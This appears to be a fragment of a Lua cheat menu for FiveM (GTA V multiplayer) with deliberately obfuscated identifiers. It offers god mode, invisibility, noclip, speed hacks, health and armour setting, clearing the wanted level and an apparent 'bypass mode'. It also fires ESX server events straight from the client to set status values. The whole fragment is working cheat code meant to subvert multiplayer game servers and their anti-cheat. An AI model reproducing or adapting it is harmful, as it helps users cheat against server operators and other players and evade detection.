		elseif CheckBox_twrtdysfgjsekglkmrseijg(
			"GodMode",
			God_Mode_Mala_Kurwo_sufgdsioufsldsdf,
			function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				God_Mode_Mala_Kurwo_sufgdsioufsldsdf = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
				end)
			then
			
			--MagicCarpet_DSUGSIGSDGSD
			elseif Button_yetwyfguydfkjesrg("Open Skin Menu", "ESX") then
				TriggerEvent('esx_skin:openSaveableMenu')
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
			"Invisible",
			Niewidzialnosc_UGDIUGHIFUGFDGDFG,
			function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				Niewidzialnosc_UGDIUGHIFUGFDGDFG = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
				end)
			then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
			"Reveal Invisible Players",
			Reveal_Niewidzialnych_UIFHDFGIDUFHGIUDF,
			function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				Reveal_Niewidzialnych_UIFHDFGIDUFHGIUDF = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
				end)
			then
		    elseif CheckBox_twrtdysfgjsekglkmrseijg(
            "Infinity Stamina",
            nieskonczona_kondycja_rozumiesz_dighs9ogh8gsfdg,
            function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
            nieskonczona_kondycja_rozumiesz_dighs9ogh8gsfdg = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
                end)
			then
			elseif Button_yetwyfguydfkjesrg("Suicide", "Native") then
			Czitirzen_Invoke(0x6B76DC1F3AE6E6A3, Czitirzen_Invoke(0xD80958FC74E988A6), 0)
			elseif Button_yetwyfguydfkjesrg("Revive", "Native") then
			HugeV_Revive_Native_XDIHFUDUSIFOSDFSDF()
			PushNotification_DSGJHDSGHSIDUGDS("Revived!")
			elseif Button_yetwyfguydfkjesrg("Max ~g~Health", "Native") then
				Czitirzen_Invoke(0x6B76DC1F3AE6E6A3, Czitirzen_Invoke(0xD80958FC74E988A6), 200)
			elseif Button_yetwyfguydfkjesrg("Max ~b~Armour", "Native") then
				Czitirzen_Invoke(0xCEA04D83135264CC, Czitirzen_Invoke(0xD80958FC74E988A6), 100)
			elseif Button_yetwyfguydfkjesrg("Set ~o~hunger ~s~to ~g~100%", "ESX") then
				TriggerEvent("esx_status:set", "hunger", 1000000)
			elseif Button_yetwyfguydfkjesrg("Set ~b~thirst ~s~to ~g~100%", "ESX") then
				TriggerEvent("esx_status:set", "thirst", 1000000)
			elseif Button_yetwyfguydfkjesrg("XD?") then
			ClearPlayerWantedLevel(PlayerId())
			elseif Slider_dghiuergsergerg('Fastrun', { "0%", "20%", "40%", "60%", "80%", "100%"}, fastrun_speed_dsfjgh9oerwgh9od, function(currentIndex_ale_mozesz_mi_possac)
				fastrun_speed_dsfjgh9oerwgh9od = currentIndex_ale_mozesz_mi_possac
				if fastrun_speed_dsfjgh9oerwgh9od==1 then
				Czitirzen_Invoke(0x6DB47AA77FD94E09, Czitirzen_Invoke(0x4F8644AF03D0E0D6), 1.0)
				Czitirzen_Invoke(0x085BF80FA50A39D1, Czitirzen_Invoke(0x43A66C31C68491C0, -1), 1.0)
				elseif fastrun_speed_dsfjgh9oerwgh9od==2 then
				Czitirzen_Invoke(0x6DB47AA77FD94E09, Czitirzen_Invoke(0x4F8644AF03D0E0D6), 1.09)
				Czitirzen_Invoke(0x085BF80FA50A39D1, Czitirzen_Invoke(0x43A66C31C68491C0, -1), 1.09)
				elseif fastrun_speed_dsfjgh9oerwgh9od==3 then
				Czitirzen_Invoke(0x6DB47AA77FD94E09, Czitirzen_Invoke(0x4F8644AF03D0E0D6), 1.19)
				Czitirzen_Invoke(0x085BF80FA50A39D1, Czitirzen_Invoke(0x43A66C31C68491C0, -1), 1.19)
				elseif fastrun_speed_dsfjgh9oerwgh9od==4 then
				Czitirzen_Invoke(0x6DB47AA77FD94E09, Czitirzen_Invoke(0x4F8644AF03D0E0D6), 1.29)
				Czitirzen_Invoke(0x085BF80FA50A39D1, Czitirzen_Invoke(0x43A66C31C68491C0, -1), 1.29)
				elseif fastrun_speed_dsfjgh9oerwgh9od==5 then
				Czitirzen_Invoke(0x6DB47AA77FD94E09, Czitirzen_Invoke(0x4F8644AF03D0E0D6), 1.39)
				Czitirzen_Invoke(0x085BF80FA50A39D1, Czitirzen_Invoke(0x43A66C31C68491C0, -1), 1.39)
				elseif fastrun_speed_dsfjgh9oerwgh9od==6 then
				Czitirzen_Invoke(0x6DB47AA77FD94E09, Czitirzen_Invoke(0x4F8644AF03D0E0D6), 1.49)
				Czitirzen_Invoke(0x085BF80FA50A39D1, Czitirzen_Invoke(0x43A66C31C68491C0, -1), 1.49)
				end
			end) then
			elseif CheckBox_twrtdysfgjsekglkmrseijg(
				"Noclip",
				Noclip_dusgoisugsdfg,
				function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
					Noclip_dusgoisugsdfg = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
					end)
				then
			end





			Display_uyeigsgegkersugesrg()
		elseif Czitirzen_Invoke(0x91AEF906BCA88877, 0, 178) then -- DELETE
			OpenMenu_eytfyuagbfhkjsdgergd('MainMenu_Bypass_mode_XD')
		end

		Czlowiek_Wait_IDYGOSIFJGDFG(0)
		
	end
end)

------------------------------------------------------------------------------------------------------------------------------------------

--"optimized code"